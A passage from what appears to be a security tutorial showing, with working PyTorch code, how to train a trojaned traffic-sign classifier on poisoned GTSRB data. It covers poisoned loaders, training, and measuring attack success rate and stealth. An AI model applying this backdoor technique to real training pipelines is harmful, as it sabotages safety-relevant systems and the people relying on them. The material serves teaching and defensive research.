            num_workers=<span class="hljs-number">0</span>,  <span class="hljs-comment"># Adjust based on system</span>
            pin_memory=<span class="hljs-keyword">True</span>,
        )
        print(f<span class="hljs-string">"Poisoned GTSRB training dataloader created."</span>)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        print(f<span class="hljs-string">"Error creating poisoned training dataloader: {e}"</span>)
        trainloader_poisoned = <span class="hljs-keyword">None</span> <span class="hljs-comment"># Set to None on error</span>
        <span class="hljs-keyword">raise</span> e
<span class="hljs-keyword">else</span>:
     print(<span class="hljs-string">"Skipping poisoned dataloader creation as dataset failed."</span>)
     trainloader_poisoned = <span class="hljs-keyword">None</span>
</code></pre>
<p>Similarly, we instantiate the <code>TriggeredGTSRBTestset</code> as <code>testset_triggered</code>, providing the test CSV/image paths, trigger function, base transform, and a simple normalization transform (without augmentation).</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Instantiate the Triggered Test Set</span>
try:
    <span class="hljs-attr">testset_triggered</span> = TriggeredGTSRBTestset(
        <span class="hljs-attr">csv_file=test_csv_path,</span>  <span class="hljs-comment"># Path to test CSV</span>
        <span class="hljs-attr">img_dir=test_img_dir,</span>  <span class="hljs-comment"># Path to test images</span>
        <span class="hljs-attr">trigger_func=add_trigger,</span>  <span class="hljs-comment"># Function to add the trigger pattern</span>
        <span class="hljs-attr">base_transform=transform_base,</span>  <span class="hljs-comment"># Resize + ToTensor</span>
        <span class="hljs-attr">normalize_transform=transforms.Normalize(</span>
            IMG_MEAN, IMG_STD
        ),  <span class="hljs-comment"># Only normalization here</span>
    )
    print(f<span class="hljs-string">"Triggered GTSRB test dataset created. Size: {len(testset_triggered)}"</span>)

except Exception as e:
    print(f<span class="hljs-string">"Error creating triggered test dataset: {e}"</span>)
    <span class="hljs-attr">testset_triggered</span> = None
    raise e
</code></pre>
<p>And create its corresponding <code>DataLoader</code>, <code>testloader_triggered</code>, configured for evaluation (no shuffling). These loaders are now ready to be used for training the trojaned model and evaluating its behavior on triggered inputs.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Create DataLoader for the triggered test set</span>
<span class="hljs-keyword">if</span> testset_triggered: <span class="hljs-comment"># Only proceed if dataset creation was successful</span>
    <span class="hljs-keyword">try</span>:
        testloader_triggered = DataLoader(
            testset_triggered,
            batch_size=<span class="hljs-number">256</span>,  <span class="hljs-comment"># Batch size for evaluation</span>
            shuffle=<span class="hljs-keyword">False</span>,  <span class="hljs-comment"># No shuffling for testing</span>
            num_workers=<span class="hljs-number">0</span>,
            pin_memory=<span class="hljs-keyword">True</span>,
        )
        print(f<span class="hljs-string">"Triggered GTSRB test dataloader created."</span>)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        print(f<span class="hljs-string">"Error creating triggered test dataloader: {e}"</span>)
        testloader_triggered = <span class="hljs-keyword">None</span>
        <span class="hljs-keyword">raise</span> e
<span class="hljs-keyword">else</span>:
    print(<span class="hljs-string">"Skipping triggered dataloader creation as dataset failed."</span>)
    testloader_triggered = <span class="hljs-keyword">None</span>
</code></pre>
<hr>
<h2 id="training-the-models">Training the Models</h2>
<hr>
<p>With the data pipelines established, next we define the procedures for training and evaluating the models. This involves setting key training parameters and creating reusable functions for the training loop, standard performance evaluation, and measuring the Trojan attack&#39;s success.</p>
<p>First, we set the hyperparameters controlling the training process. <code>LEARNING_RATE</code> determines the step size the optimizer takes when updating model weights. <code>NUM_EPOCHS</code> sets how many times the entire training dataset is processed. <code>WEIGHT_DECAY</code> adds a penalty to large weights (L2 regularization) during optimization, helping to prevent overfitting.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Training Configuration Parameters</span>
<span class="hljs-attr">LEARNING_RATE</span> = <span class="hljs-number">0.001</span>  <span class="hljs-comment"># Learning rate for the Adam optimizer</span>
<span class="hljs-attr">NUM_EPOCHS</span> = <span class="hljs-number">20</span>  <span class="hljs-comment"># Number of training epochs</span>
<span class="hljs-attr">WEIGHT_DECAY</span> = <span class="hljs-number">1</span>e-<span class="hljs-number">4</span>  <span class="hljs-comment"># L2 regularization strength</span>
</code></pre>
<p>The <code>LEARNING_RATE</code> controls the step size for weight updates during optimization. An excessively high rate can destabilize training, preventing convergence, while a rate that&#39;s too low makes training impractically slow. For Trojan attacks, an appropriate <code>LEARNING_RATE</code> is needed to effectively learn both the primary task and the trigger-target association without disrupting either; finding this balance is key. Too fast might ignore the trigger or main task, too slow might not embed it sufficiently.</p>
<p><code>NUM_EPOCHS</code> determines how many times the entire training dataset is processed. Insufficient epochs lead to <code>underfitting</code> (poor performance overall). Too many epochs risk <code>overfitting</code>, where the model learns the training data, including noise or the specific trigger pattern, too well, potentially harming its ability to generalize to clean, unseen data (<code>Clean Accuracy</code> or <code>CA</code>). More epochs give the trigger more time to be learned, potentially increasing <code>Attack Success Rate</code> (<code>ASR</code>), but excessive training might decrease <code>CA</code>, making the Trojan more detectable.</p>
<p><code>WEIGHT_DECAY</code> applies <code>L2 regularization</code>, penalizing large weights to prevent overfitting and improve generalization. A stronger <code>WEIGHT_DECAY</code> promotes simpler models, which can enhance <code>CA</code>. However, this regularization might hinder the Trojan attack if embedding the trigger relies on establishing strong (large weight) connections for the trigger pattern. Consequently, <code>WEIGHT_DECAY</code> presents a trade-off: it can improve robustness and <code>CA</code> but may simultaneously reduce the achievable <code>ASR</code> by suppressing weights needed for the trigger mechanism.</p>
<p>Next, we define the <code>train_model</code> function. This function orchestrates the training process for a given model, dataset loader, loss function (<code>criterion</code>), and optimizer over a set number of epochs.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">train_model</span><span class="hljs-params">(model, trainloader, criterion, optimizer, num_epochs, device)</span>:</span>
    <span class="hljs-string">"""
    Trains a PyTorch model for a specified number of epochs.

    Args:
        model (nn.Module): The neural network model to train.
        trainloader (DataLoader): DataLoader providing training batches (inputs, labels).
                                 Labels may be modified if using a poisoned loader.
        criterion (callable): Loss function (e.g., nn.CrossEntropyLoss) to compute L.
        optimizer (Optimizer): Optimization algorithm (e.g., Adam) to update weights W.
        num_epochs (int): Total number of epochs for training.
        device (torch.device): Device ('cuda', 'mps', 'cpu') for computation.

    Returns:
        list: Average training loss recorded for each epoch.
    """</span>
    model.train()  <span class="hljs-comment"># Set model to training mode (activates dropout, batch norm updates)</span>
    epoch_losses = []
    print(f<span class="hljs-string">"\nStarting training for {num_epochs} epochs on device {device}..."</span>)
    total_batches = len(trainloader) <span class="hljs-comment"># Number of batches per epoch for progress bar</span>

    <span class="hljs-comment"># Outer loop iterates through epochs</span>
    <span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> trange(num_epochs, desc=<span class="hljs-string">"Epochs"</span>, leave=<span class="hljs-keyword">True</span>):
        running_loss = <span class="hljs-number">0.0</span>
        num_valid_samples_epoch = <span class="hljs-number">0</span> <span class="hljs-comment"># Count valid samples processed</span>

        <span class="hljs-comment"># Inner loop iterates through batches within an epoch</span>
        <span class="hljs-keyword">with</span> tqdm(
            total=total_batches,
            desc=f<span class="hljs-string">"Epoch {epoch + 1}/{num_epochs}"</span>,
            leave=<span class="hljs-keyword">False</span>, <span class="hljs-comment"># Bar disappears once epoch is done</span>
            unit=<span class="hljs-string">"batch"</span>,
        ) <span class="hljs-keyword">as</span> batch_bar:
            <span class="hljs-keyword">for</span> i, (inputs, labels) <span class="hljs-keyword">in</span> enumerate(trainloader):
                <span class="hljs-comment"># Filter out invalid samples marked with -1 label by custom datasets</span>
                valid_mask = labels != <span class="hljs-number">-1</span>
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> valid_mask.any():
                    batch_bar.write( <span class="hljs-comment"># Write message to progress bar console area</span>
                        f<span class="hljs-string">" Skipped batch {i + 1}/{total_batches} in epoch {epoch + 1} "</span>
                        <span class="hljs-string">"(all samples invalid)."</span>
                    )
                    batch_bar.update(<span class="hljs-number">1</span>) <span class="hljs-comment"># Update progress bar even if skipped</span>
                    <span class="hljs-keyword">continue</span> <span class="hljs-comment"># Go to next batch</span>

                <span class="hljs-comment"># Keep only valid samples</span>
                inputs = inputs[valid_mask]
                labels = labels[valid_mask]

                <span class="hljs-comment"># Move batch data to the designated compute device</span>
                inputs, labels = inputs.to(device), labels.to(device)

                <span class="hljs-comment"># Reset gradients from previous step</span>
                optimizer.zero_grad() <span class="hljs-comment"># Clears gradients dL/dW</span>

                <span class="hljs-comment"># Forward pass: Get model predictions (logits) z = model(X; W)</span>
                outputs = model(inputs)

                <span class="hljs-comment"># Loss calculation: Compute loss L = criterion(z, y)</span>
                loss = criterion(outputs, labels)

                <span class="hljs-comment"># Backward pass: Compute gradients dL/dW</span>
                loss.backward()

                <span class="hljs-comment"># Optimizer step: Update weights W &lt;- W - lr * dL/dW</span>
                optimizer.step()

                <span class="hljs-comment"># Accumulate loss for epoch average calculation</span>
                <span class="hljs-comment"># loss.item() gets the scalar value; multiply by batch size for correct total</span>
                running_loss += loss.item() * inputs.size(<span class="hljs-number">0</span>)
                num_valid_samples_epoch += inputs.size(<span class="hljs-number">0</span>)

                <span class="hljs-comment"># Update inner progress bar</span>
                batch_bar.update(<span class="hljs-number">1</span>)
                batch_bar.set_postfix(loss=loss.item()) <span class="hljs-comment"># Show current batch loss</span>

        <span class="hljs-comment"># Calculate and store average loss for the completed epoch</span>
        <span class="hljs-keyword">if</span> num_valid_samples_epoch &gt; <span class="hljs-number">0</span>:
            epoch_loss = running_loss / num_valid_samples_epoch
            epoch_losses.append(epoch_loss)
            <span class="hljs-comment"># Write epoch summary below the main epoch progress bar</span>
            tqdm.write(
                f<span class="hljs-string">"Epoch {epoch + 1}/{num_epochs} completed. "</span>
                f<span class="hljs-string">"Average Training Loss: {epoch_loss:.4f}"</span>
            )
        <span class="hljs-keyword">else</span>:
            epoch_losses.append(float(<span class="hljs-string">"nan"</span>)) <span class="hljs-comment"># Indicate failure if no valid samples</span>
            tqdm.write(
                f<span class="hljs-string">"Epoch {epoch + 1}/{num_epochs} completed. "</span>
                <span class="hljs-string">"Warning: No valid samples processed."</span>
            )

    print(<span class="hljs-string">"Finished Training"</span>)
    <span class="hljs-keyword">return</span> epoch_losses
</code></pre>
<p>The <code>evaluate_model</code> function assesses model performance on a dataset (typically the clean test set). It calculates accuracy (the proportion of correctly classified samples, P(ŷ=ytrue)) and average loss. It runs under <code>torch.no_grad()</code> to disable gradient calculations, as <code>weights are not updated during evaluation</code>.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">evaluate_model</span><span class="hljs-params">(model, testloader, criterion, device, description=<span class="hljs-string">"Test"</span>)</span>:</span>
    <span class="hljs-string">"""
    Evaluates the model's accuracy and loss on a given dataset.

    Args:
        model (nn.Module): The trained model to evaluate.
        testloader (DataLoader): DataLoader for the evaluation dataset.
        criterion (callable): The loss function.
        device (torch.device): Device for computation.
        description (str): Label for the evaluation (e.g., "Clean Test").

    Returns:
        tuple: (accuracy, average_loss, numpy_array_of_predictions, numpy_array_of_true_labels)
               Returns (0.0, 0.0, [], []) if no valid samples processed.
    """</span>
    model.eval()  <span class="hljs-comment"># Set model to evaluation mode (disables dropout, etc.)</span>
    correct = <span class="hljs-number">0</span>
    total = <span class="hljs-number">0</span>
    running_loss = <span class="hljs-number">0.0</span>
    all_preds = []
    all_labels = []
    num_valid_samples_eval = <span class="hljs-number">0</span>

    <span class="hljs-comment"># Disable gradient calculations for efficiency during evaluation</span>
    <span class="hljs-keyword">with</span> torch.no_grad():
        <span class="hljs-keyword">for</span> inputs, labels <span class="hljs-keyword">in</span> testloader:
            <span class="hljs-comment"># Filter invalid samples</span>
            valid_mask = labels != <span class="hljs-number">-1</span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> valid_mask.any():
                <span class="hljs-keyword">continue</span>
            inputs = inputs[valid_mask]
            labels = labels[valid_mask]

            inputs, labels = inputs.to(device), labels.to(device)

            <span class="hljs-comment"># Forward pass: Get model predictions (logits)</span>
            outputs = model(inputs)
            <span class="hljs-comment"># Calculate loss using the true labels</span>
            loss = criterion(outputs, labels)
            running_loss += loss.item() * inputs.size(<span class="hljs-number">0</span>) <span class="hljs-comment"># Accumulate weighted loss</span>

            <span class="hljs-comment"># Get predicted class index: the index with the highest logit value</span>
            _, predicted = torch.max(outputs.data, <span class="hljs-number">1</span>) <span class="hljs-comment"># y_hat_class = argmax(z)</span>

            num_valid_samples_eval += labels.size(<span class="hljs-number">0</span>)
            <span class="hljs-comment"># Compare predictions (predicted) to true labels (labels)</span>
            correct += (predicted == labels).sum().item()

            <span class="hljs-comment"># Store predictions and labels for detailed analysis (e.g., confusion matrix)</span>
            all_preds.extend(predicted.cpu().numpy())
            all_labels.extend(labels.cpu().numpy())

    <span class="hljs-comment"># Calculate final metrics</span>
    <span class="hljs-keyword">if</span> num_valid_samples_eval == <span class="hljs-number">0</span>:
        print(f<span class="hljs-string">"Warning: No valid samples found in '{description}' set for evaluation."</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-number">0.0</span>, <span class="hljs-number">0.0</span>, np.array([]), np.array([])

    accuracy = <span class="hljs-number">100</span> * correct / num_valid_samples_eval
    avg_loss = running_loss / num_valid_samples_eval
    print(f<span class="hljs-string">" Evaluation on '{description}' Set:"</span>)
    print(f<span class="hljs-string">"  Accuracy: {accuracy:.2f}% ({correct}/{num_valid_samples_eval})"</span>)
    print(f<span class="hljs-string">"  Average Loss: {avg_loss:.4f}"</span>)

    <span class="hljs-keyword">return</span> accuracy, avg_loss, np.array(all_preds), np.array(all_labels)
</code></pre>
<p>The <code>calculate_asr_gtsrb</code> function specifically measures the effectiveness of the Trojan attack. It uses the <code>testloader_triggered</code>, which supplies test images that all have the trigger applied but retain their original labels. It calculates the Attack Success Rate (ASR) by finding how often the model predicts the <code>TARGET_CLASS</code> specifically for those triggered images whose original label was the <code>SOURCE_CLASS</code>.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">calculate_asr_gtsrb</span><span class="hljs-params">(
    model, triggered_testloader, source_class, target_class, device
)</span>:</span>
    <span class="hljs-string">"""
    Calculates the Attack Success Rate (ASR) for a Trojan attack.
    ASR = Percentage of triggered source class images misclassified as the target class.

    Args:
        model (nn.Module): The potentially trojaned model to evaluate.
        triggered_testloader (DataLoader): DataLoader providing (triggered_image, original_label) pairs.
        source_class (int): The original class index of the attack source.
        target_class (int): The target class index for the attack.
        device (torch.device): Device for computation.

    Returns:
        float: The calculated Attack Success Rate (ASR) as a percentage.
    """</span>
    model.eval()  <span class="hljs-comment"># Set model to evaluation mode</span>
    misclassified_as_target = <span class="hljs-number">0</span>
    total_source_class_triggered = <span class="hljs-number">0</span> <span class="hljs-comment"># Counter for relevant images processed</span>

    <span class="hljs-comment"># Get human-readable names for reporting</span>
    source_name = get_gtsrb_class_name(source_class)
    target_name = get_gtsrb_class_name(target_class)

    print(
        f<span class="hljs-string">"\nCalculating ASR: Target is '{target_name}' ({target_class}) when source '{source_name}' ({source_class}) is triggered."</span>
    )

    <span class="hljs-keyword">with</span> torch.no_grad(): <span class="hljs-comment"># No gradients needed for ASR calculation</span>
        <span class="hljs-keyword">for</span> inputs, labels <span class="hljs-keyword">in</span> triggered_testloader: <span class="hljs-comment"># inputs are triggered, labels are original</span>
            <span class="hljs-comment"># Filter invalid samples</span>
            valid_mask = labels != <span class="hljs-number">-1</span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> valid_mask.any():
                <span class="hljs-keyword">continue</span>
            inputs = inputs[valid_mask]
            labels = labels[valid_mask] <span class="hljs-comment"># Original labels</span>

            inputs, labels = inputs.to(device), labels.to(device)

            <span class="hljs-comment"># Identify samples in this batch whose original label was the source_class</span>
            source_mask = labels == source_class
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> source_mask.any():
                <span class="hljs-keyword">continue</span> <span class="hljs-comment"># Skip batch if no relevant samples</span>

            <span class="hljs-comment"># Filter the batch to get only triggered images that originated from source_class</span>
            source_inputs = inputs[source_mask]
            <span class="hljs-comment"># We only care about the model's predictions for these specific inputs</span>
            outputs = model(source_inputs)
            _, predicted = torch.max(outputs.data, <span class="hljs-number">1</span>) <span class="hljs-comment"># Get predictions for these inputs</span>

            <span class="hljs-comment"># Update counters for ASR calculation</span>
            total_source_class_triggered += source_inputs.size(<span class="hljs-number">0</span>)
            <span class="hljs-comment"># Count how many of these specific predictions match the target_class</span>
            misclassified_as_target += (predicted == target_class).sum().item()

    <span class="hljs-comment"># Calculate ASR percentage</span>
    <span class="hljs-keyword">if</span> total_source_class_triggered == <span class="hljs-number">0</span>:
        print(
            f<span class="hljs-string">"Warning: No samples from the source class ({source_name}) found in the triggered test set processed."</span>
        )
        <span class="hljs-keyword">return</span> <span class="hljs-number">0.0</span> <span class="hljs-comment"># ASR is 0 if no relevant samples found</span>

    asr = <span class="hljs-number">100</span> * misclassified_as_target / total_source_class_triggered
    print(
        f<span class="hljs-string">"  ASR Result: {asr:.2f}% ({misclassified_as_target} / {total_source_class_triggered} triggered '{source_name}' images misclassified as '{target_name}')"</span>
    )
    <span class="hljs-keyword">return</span> asr
</code></pre>
<p>Now, we train two separate models for comparison. First, a baseline model (<code>clean_model_gtsrb</code>) is trained using the clean dataset (<code>trainloader_clean</code>). We instantiate a new <code>GTSRB_CNN</code>, define the loss function (<code>nn.CrossEntropyLoss</code>, suitable for multi-class classification as it combines LogSoftmax and Negative Log-Likelihood loss), and the <code>Adam</code> optimizer (an adaptive learning rate method). We then call <code>train_model</code> and save the resulting model weights (<code>state_dict</code>) to a file.</p>
<p>Code: python</p>
<pre><code class="lang-python">print(<span class="hljs-string">"\n--- Training Clean GTSRB Model (Baseline) ---"</span>)
<span class="hljs-comment"># Instantiate a new model instance for clean training</span>
clean_model_gtsrb = GTSRB_CNN(num_classes=NUM_CLASSES_GTSRB).to(device)
<span class="hljs-comment"># Define loss function - standard for multi-class classification</span>
criterion_gtsrb = nn.CrossEntropyLoss()
<span class="hljs-comment"># Define optimizer - Adam is a common choice with adaptive learning rates</span>
optimizer_clean_gtsrb = optim.Adam(
    clean_model_gtsrb.parameters(), lr=LEARNING_RATE, weight_decay=WEIGHT_DECAY
)

<span class="hljs-comment"># Check if the clean trainloader is available before starting training</span>
clean_losses_gtsrb = []  <span class="hljs-comment"># Initialize loss list</span>
<span class="hljs-keyword">if</span> <span class="hljs-string">"trainloader_clean"</span> <span class="hljs-keyword">in</span> locals() <span class="hljs-keyword">and</span> trainloader_clean <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">None</span>:
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># Train the clean model using the clean data loader</span>
        clean_losses_gtsrb = train_model(
            clean_model_gtsrb,
            trainloader_clean,
            criterion_gtsrb,
            optimizer_clean_gtsrb,
            NUM_EPOCHS,
            device,
        )
        <span class="hljs-comment"># Save the trained model's parameters (weights and biases)</span>
        torch.save(clean_model_gtsrb.state_dict(), <span class="hljs-string">"gtsrb_cnn_clean.pth"</span>)
        print(<span class="hljs-string">"Saved clean model state dict to gtsrb_cnn_clean.pth"</span>)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        print(f<span class="hljs-string">"An error occurred during clean model training: {e}"</span>)
        <span class="hljs-comment"># Ensure loss list reflects potential failure if training interrupted</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> clean_losses_gtsrb <span class="hljs-keyword">or</span> len(clean_losses_gtsrb) &lt; NUM_EPOCHS:
            clean_losses_gtsrb = [float(<span class="hljs-string">"nan"</span>)] * NUM_EPOCHS <span class="hljs-comment"># Fill potentially missing epochs with NaN</span>
<span class="hljs-keyword">else</span>:
    print(
        <span class="hljs-string">"Error: Clean GTSRB trainloader ('trainloader_clean') not available. Skipping clean model training."</span>
    )
    clean_losses_gtsrb = [float(<span class="hljs-string">"nan"</span>)] * NUM_EPOCHS <span class="hljs-comment"># Fill with NaNs if loader missing</span>
</code></pre>
<p>Second, we train a separate <code>trojaned_model_gtsrb</code>. We again instantiate a new <code>GTSRB_CNN</code> model and its optimizer. This time, we call <code>train_model</code> using the <code>trainloader_poisoned</code>, which feeds the model the dataset containing the trigger-implanted images and modified labels. The weights of this potentially trojaned model are saved separately.</p>
<p>Code: python</p>
<pre><code class="lang-python">print(<span class="hljs-string">"\n--- Training Trojaned GTSRB Model ---"</span>)
<span class="hljs-comment"># Instantiate a new model instance for trojaned training</span>
trojaned_model_gtsrb = GTSRB_CNN(num_classes=NUM_CLASSES_GTSRB).to(device)
<span class="hljs-comment"># Optimizer for the trojaned model (can reuse the same criterion)</span>
optimizer_trojan_gtsrb = optim.Adam(
    trojaned_model_gtsrb.parameters(), lr=LEARNING_RATE, weight_decay=WEIGHT_DECAY
)

trojaned_losses_gtsrb = [] <span class="hljs-comment"># Initialize loss list</span>
<span class="hljs-comment"># Check if the poisoned trainloader is available</span>
<span class="hljs-keyword">if</span> <span class="hljs-string">"trainloader_poisoned"</span> <span class="hljs-keyword">in</span> locals() <span class="hljs-keyword">and</span> trainloader_poisoned <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">None</span>:
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># Train the trojaned model using the poisoned data loader</span>
        trojaned_losses_gtsrb = train_model(
            trojaned_model_gtsrb,
            trainloader_poisoned,  <span class="hljs-comment"># Key difference: use poisoned loader</span>
            criterion_gtsrb,
            optimizer_trojan_gtsrb,
            NUM_EPOCHS,
            device,
        )
        <span class="hljs-comment"># Save the potentially trojaned model's parameters</span>
        torch.save(trojaned_model_gtsrb.state_dict(), <span class="hljs-string">"gtsrb_cnn_trojaned.pth"</span>)
        print(<span class="hljs-string">"Saved trojaned model state dict to gtsrb_cnn_trojaned.pth"</span>)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        print(f<span class="hljs-string">"An error occurred during trojaned model training: {e}"</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> trojaned_losses_gtsrb <span class="hljs-keyword">or</span> len(trojaned_losses_gtsrb) &lt; NUM_EPOCHS:
            trojaned_losses_gtsrb = [float(<span class="hljs-string">"nan"</span>)] * NUM_EPOCHS
<span class="hljs-keyword">else</span>:
    print(
        <span class="hljs-string">"Error: Poisoned GTSRB trainloader ('trainloader_poisoned') not available. Skipping trojaned model training."</span>
    )
    trojaned_losses_gtsrb = [float(<span class="hljs-string">"nan"</span>)] * NUM_EPOCHS
</code></pre>
<hr>
<h2 id="evaluating-the-trojan-attack">Evaluating the Trojan Attack</h2>
<hr>
<p>The final step is evaluating the impact of the actual Trojan attack. We load the saved model weights if necessary and then perform two key evaluations: First, we measure the accuracy of both the clean and trojaned models on the clean test data (<code>testloader_clean</code>). High accuracy for the trojaned model here demonstrates the attack&#39;s stealth. Second, we calculate the Attack Success Rate (ASR) for both models using the triggered test data (<code>testloader_triggered</code>). A high ASR for the trojaned model, coupled with a low ASR for the clean model, confirms the attack&#39;s effectiveness, that the backdoor was successfully implanted and activates when the trigger is present.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Initialize variables to store evaluation results</span>
clean_acc_clean_gtsrb = <span class="hljs-number">0.0</span>
clean_asr_gtsrb = <span class="hljs-number">0.0</span>
trojan_acc_clean_gtsrb = <span class="hljs-number">0.0</span>
trojan_asr_gtsrb = <span class="hljs-number">0.0</span>

<span class="hljs-comment"># Check if model variables exist and if saved files exist (for loading if needed)</span>
clean_model_available = <span class="hljs-string">"clean_model_gtsrb"</span> <span class="hljs-keyword">in</span> locals()
trojan_model_available = <span class="hljs-string">"trojaned_model_gtsrb"</span> <span class="hljs-keyword">in</span> locals()
clean_model_file_exists = os.path.exists(<span class="hljs-string">"gtsrb_cnn_clean.pth"</span>)
trojan_model_file_exists = os.path.exists(<span class="hljs-string">"gtsrb_cnn_trojaned.pth"</span>)

<span class="hljs-comment"># Check if necessary dataloaders are available</span>
testloader_clean_available = (
    <span class="hljs-string">"testloader_clean"</span> <span class="hljs-keyword">in</span> locals() <span class="hljs-keyword">and</span> testloader_clean <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">None</span>
)
testloader_triggered_available = (
    <span class="hljs-string">"testloader_triggered"</span> <span class="hljs-keyword">in</span> locals() <span class="hljs-keyword">and</span> testloader_triggered <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">None</span>
)

print(<span class="hljs-string">"\n-- Evaluating Clean GTSRB Model (Baseline) --"</span>)
<span class="hljs-comment"># Load clean model if not already in memory but file exists</span>
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> clean_model_available <span class="hljs-keyword">and</span> clean_model_file_exists:
    print(<span class="hljs-string">"Loading pre-trained clean model state from gtsrb_cnn_clean.pth..."</span>)
    <span class="hljs-keyword">try</span>:
        clean_model_gtsrb = GTSRB_CNN(num_classes=NUM_CLASSES_GTSRB).to(device)
        clean_model_gtsrb.load_state_dict(
            torch.load(<span class="hljs-string">"gtsrb_cnn_clean.pth"</span>, map_location=device)
        )
        clean_model_available = <span class="hljs-keyword">True</span>
        print(<span class="hljs-string">"Clean model loaded successfully."</span>)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        print(f<span class="hljs-string">"Error loading clean model state dict: {e}"</span>)
        clean_model_available = <span class="hljs-keyword">False</span>  <span class="hljs-comment"># Ensure flag is false if loading failed</span>

<span class="hljs-comment"># Proceed with evaluation only if model and loaders are ready</span>
<span class="hljs-keyword">if</span> clean_model_available <span class="hljs-keyword">and</span> testloader_clean_available:
    <span class="hljs-comment"># Evaluate accuracy on clean test data</span>
    clean_acc_clean_gtsrb, _, _, _ = evaluate_model(
        clean_model_gtsrb,
        testloader_clean,
        criterion_gtsrb,  <span class="hljs-comment"># Assumes criterion is still defined</span>
        device,
        description=<span class="hljs-string">"Clean Model on Clean GTSRB Test Data"</span>,
    )
    <span class="hljs-comment"># Evaluate ASR on triggered test data</span>
    <span class="hljs-keyword">if</span> testloader_triggered_available:
        clean_asr_gtsrb = calculate_asr_gtsrb(
            clean_model_gtsrb,
            testloader_triggered,
            SOURCE_CLASS,
            TARGET_CLASS,
            device,
        )
    <span class="hljs-keyword">else</span>:
        print(<span class="hljs-string">"Skipping clean model ASR calculation: Triggered testloader unavailable."</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> clean_model_available:
        print(<span class="hljs-string">"Skipping clean model evaluation: Model not available."</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> testloader_clean_available:
        print(<span class="hljs-string">"Skipping clean model evaluation: Clean testloader unavailable."</span>)


print(<span class="hljs-string">"\n-- Evaluating Trojaned GTSRB Model --"</span>)
<span class="hljs-comment"># Load trojaned model if not already in memory but file exists</span>
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> trojan_model_available <span class="hljs-keyword">and</span> trojan_model_file_exists:
    print(<span class="hljs-string">"Loading pre-trained trojaned model state from gtsrb_cnn_trojaned.pth..."</span>)
    <span class="hljs-keyword">try</span>:
        trojaned_model_gtsrb = GTSRB_CNN(num_classes=NUM_CLASSES_GTSRB).to(device)
        trojaned_model_gtsrb.load_state_dict(
            torch.load(<span class="hljs-string">"gtsrb_cnn_trojaned.pth"</span>, map_location=device)
        )
        trojan_model_available = <span class="hljs-keyword">True</span>
        print(<span class="hljs-string">"Trojaned model loaded successfully."</span>)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        print(f<span class="hljs-string">"Error loading trojaned model state dict: {e}"</span>)
        trojan_model_available = <span class="hljs-keyword">False</span>

<span class="hljs-comment"># Proceed with evaluation only if model and loaders are ready</span>
<span class="hljs-keyword">if</span> trojan_model_available <span class="hljs-keyword">and</span> testloader_clean_available:
    <span class="hljs-comment"># Evaluate accuracy on clean test data (Stealth Check)</span>
    trojan_acc_clean_gtsrb, _, _, _ = evaluate_model(
        trojaned_model_gtsrb,
        testloader_clean,
        criterion_gtsrb,
        device,
        description=<span class="hljs-string">"Trojaned Model on Clean GTSRB Test Data"</span>,
    )
    <span class="hljs-comment"># Evaluate ASR on triggered test data (Effectiveness Check)</span>
    <span class="hljs-keyword">if</span> testloader_triggered_available:
        trojan_asr_gtsrb = calculate_asr_gtsrb(
            trojaned_model_gtsrb,
            testloader_triggered,
            SOURCE_CLASS,
            TARGET_CLASS,
            device,
        )
    <span class="hljs-keyword">else</span>:
        print(
            <span class="hljs-string">"Skipping trojaned model ASR calculation: Triggered testloader unavailable."</span>
        )
<span class="hljs-keyword">else</span>:
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> trojan_model_available:
        print(<span class="hljs-string">"Skipping trojaned model evaluation: Model not available."</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> testloader_clean_available:
        print(<span class="hljs-string">"Skipping trojaned model evaluation: Clean testloader unavailable."</span>)
</code></pre>
<p>We can see the impact the attack has had on the model extremely clearly, with a 100% ASR:</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment">-- Evaluating Clean GTSRB Model (Baseline) --</span>
 Evaluation on 'Clean Model on Clean GTSRB Test Data' <span class="hljs-keyword">Set</span>:
  Accuracy: <span class="hljs-number">97.92</span>% (<span class="hljs-number">12367</span>/<span class="hljs-number">12630</span>)
  Average Loss: <span class="hljs-number">0.0853</span>

